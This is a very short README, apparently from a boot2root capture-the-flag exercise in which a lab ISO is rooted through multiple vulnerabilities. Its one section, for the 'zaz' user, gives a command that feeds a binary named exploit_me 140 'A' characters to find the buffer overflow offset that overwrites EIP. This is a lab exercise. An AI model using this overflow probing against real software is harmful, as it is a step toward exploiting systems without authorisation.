# boot2root
root a iso using multiple vulnerabilities 


## ZAZ user

#### find char numbers to overwrite the EIP

```
./exploit_me `printf 'A%.0s' {1..140}`
```
